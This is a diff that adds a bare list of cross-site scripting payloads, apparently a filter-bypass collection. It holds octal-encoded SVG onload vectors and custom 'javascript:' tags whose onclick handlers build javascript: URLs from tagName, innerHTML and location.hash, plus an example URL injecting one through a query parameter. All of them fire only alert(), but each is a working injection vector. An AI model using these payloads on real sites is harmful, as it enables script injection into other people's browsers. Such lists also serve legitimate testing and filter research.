@@ -1,0 +1,24 @@
+<JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
+
+<svg onload=alert(tagName)>
+
+<javascript onclick=alert(tagName)>click me!
+
+<javascript onclick=alert(tagName%2Blocation.hash)>click me!#:alert(1)
+
+<javascript: onclick=alert(tagName%2BinnerHTML%2Blocation.hash)>/*click me!#*/alert(1)
+
+<javascript: onclick=location=tagName%2BinnerHTML%2Blocation.hash>/*click me!#*/alert(1)
+
+<javascript: onclick=location=tagName%2BinnerHTML%2Blocation.hash>’click me!#’-alert(1)
+
+<javascript: onclick=alert(tagName%2BinnerHTML%2Blocation.hash)>’click me!</javascript:>#’-alert(1)
+
+<javascript onclick=location=tagName%2binnerHTML%2blocation.hash>:/*click me!#*/alert(9) 
+
+<javascript onclick=location=tagName%2binnerHTML%2blocation.hash>:’click me!#’-alert(9)
+
+---------
+    <javascript: onclick=location=tagName%2bURL>click me!#%0Aalert(1)
+
+    javascript: + http://domain/page?p=<javascript: onclick=location=tagName%2bURL>click me!#%0Aalert(1)
